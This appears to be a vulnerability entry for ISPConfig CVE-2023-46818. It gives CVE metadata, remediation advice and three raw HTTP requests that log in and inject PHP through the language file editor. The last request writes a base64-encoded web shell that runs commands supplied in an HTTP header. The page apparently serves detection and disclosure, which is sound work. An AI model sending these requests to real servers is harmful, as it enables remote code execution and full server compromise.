---
layout: post
cve_id: CVE-2023-46818
title: ISPConfig - PHP Code Injection
pcap: true
pcap_path: /pcaps/2023/CVE-2023-46818.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-46818.yaml
snort2_rule: N/A
snort3_rule: N/A
author: non-things
severity: high
impact: 'Authenticated administrators can inject and execute arbitrary PHP code, potentially
  gaining complete server control.

  '
remediation: 'Upgrade ISPConfig to version 3.2.11p1 or later, and ensure admin_allow_langedit
  is disabled unless absolutely necessary.

  '
reference:
- https://www.ispconfig.org/blog/ispconfig-3-2-11p1-released/
- http://packetstormsecurity.com/files/176126/ISPConfig-3.2.11-PHP-Code-Injection.html
- http://seclists.org/fulldisclosure/2023/Dec/2
- https://nvd.nist.gov/vuln/detail/CVE-2023-46818
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 7.2
  cve-id: CVE-2023-46818
  cwe-id: CWE-94
  epss-score: 0.90623
  epss-percentile: 0.99592
metadata:
  verified: true
  max-request: 1
  product: ispconfig
tags:
- cve
- cve2023
- ispconfig
- php
- rce
- vuln
---

## üîç Vulnerability Description
An issue was discovered in ISPConfig before 3.2.11p1. PHP code injection can be achieved in the language file editor by an admin if admin_allow_langedit is enabled.


## üåê HTTP Request
```nohighlight
POST /login/index.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Connection: close
Content-Length: 43
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

username=RNhYex&password=q3oLWQ&s_mod=login
```

```nohighlight
POST /admin/language_edit.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Connection: close
Content-Length: 60
Accept: */*
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

lang=en&module=help&lang_file=CyUqbMePYIZyHNISqAXMsvtndp.lng
```

```nohighlight
POST /admin/language_edit.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15
Connection: close
Content-Length: 317
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

lang=en&module=help&lang_file=CyUqbMePYIZyHNISqAXMsvtndp.lng&_csrf_id=dvX8Br&_csrf_key=xEHIGN&records[%5C]='%5D%3Bfile_put_contents('P4pioItB9BAvyKsqo79pi9Jemt0ogLxk.php'%2Cbase64_decode('PD9waHAgcHJpbnQoJ19fX18nKTsgcGFzc3RocnUoYmFzZTY0X2RlY29kZSgkX1NFUlZFUlsnSFRUUF9DJ10pKTsgcHJpbnQoJ19fX18nKTsgPz4%3D'))%3Bdie%3B%23
```

